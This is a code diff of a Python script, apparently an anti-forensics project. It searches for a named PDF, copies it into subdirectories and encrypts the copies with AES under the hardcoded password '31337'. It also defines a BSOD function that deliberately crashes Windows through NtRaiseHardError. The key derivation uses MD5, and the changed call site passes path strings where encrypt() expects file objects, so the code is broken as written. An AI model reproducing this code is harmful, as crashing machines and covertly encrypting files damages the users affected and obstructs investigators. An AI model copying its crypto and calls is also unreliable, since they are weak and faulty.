@@ -2,11 +2,14 @@ import json
 import subprocess
 import time
 import os
+from os import urandom
 import shutil
 import random
 import ctypes
 from pathlib import Path
 from dataclasses import dataclass
+from hashlib import md5
+from Cryptodome.Cipher import AES
 
 #step 1
 #detect USB drive
@@ -27,6 +30,7 @@ rootDir = 'D:\documents'
 
 fileToSearch = 'Acad Calendar_SIT JDP 2022.pdf'
 fileRenamed = 'copi.pdf'
+password = '31337'
 
 #newPath=Path('D:\documents')
 newPath=Path('C:\documents')
@@ -40,19 +44,41 @@ def BSOD():
     response = ctypes.c_ulong()
     res = ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(response))
 
-def encrypt(fileRenamed):
-    key = "4n71-F0r3n51c5"
+'''
+Function to get key and initialisation vector from the password + salt
+    password is chosen by user
+    salt is added to password for additional complication
+    keyLength is length of the encryption key in bytes
+    ivLength is the length of the initialisation vector in bytes
+2 values will be return: key and iv
+'''
+def getKeyAndIv(password, salt, keyLength, ivLength): 
+    d = d_i = b''
+    while len(d) < keyLength + ivLength:
+        d_i = md5(d_i + str.encode(password) + salt).digest() # get md5 hash value
+        d += d_i
+    return d[:keyLength], d[keyLength:keyLength+ivLength]
 
-    # opening fileToSearch in read only mode in binary format
-    with open(fileRenamed, 'rb') as file:
-        fileB4Enc = file.read()  # file before encryption
+'''
+fileToSearch is the plaintext file
+encFile is the encrypted file
+call getKeyAndIv to create key and iv for cipher creation
+'''
+def encrypt(fileToSearch, encFile, password, key_length=32):
+    bs = AES.block_size # 16 bytes
+    salt = urandom(bs) # return a string of random bytes
+    key, iv = getKeyAndIv(password, salt, key_length, bs)
+    cipher = AES.new(key, AES.MODE_CBC, iv)  # MODE_CBC or Ciphertext Block Chaining
+    encFile.write(salt)
+    finished = False
 
-    # encrypting the file
-    encryptFile = key.encrypt(fileB4Enc)
-
-    # opening the file in write mode to write the encrypted data
-    with open(fileRenamed, 'wb') as encrypted_file:
-        encrypted_file.write(encryptFile)
+    while not finished:
+        chunk = fileToSearch.read(1024 * bs) 
+        if len(chunk) == 0 or len(chunk) % bs != 0:# add padding before encryption
+            padding_length = (bs - len(chunk) % bs) or bs
+            chunk += str.encode(padding_length * chr(padding_length))
+            finished = True
+        encFile.write(cipher.encrypt(chunk))
 
 def fileManip(): #manipulate file by copy and to other directory
     subdirectories = [x for x in newPath.iterdir() if x.is_dir()]
@@ -70,7 +96,8 @@ def fileManip(): #manipulate file by copy and to other directory
         print(subdirectories[x])## to know which folder it goes
         dstPath=str(subdirectories[x])
         shutil.copyfile(filePath,dstPath+"\\"+fileRenamed)
-        encrypt(dstPath+"\\"+fileRenamed)
+        with open(dstPath+"\\"+fileRenamed, 'rb') as in_file, open(fileRenamed, 'wb') as out_file:
+            encrypt(dstPath+"\\"+fileRenamed, fileRenamed, password)
 
 
 @dataclass
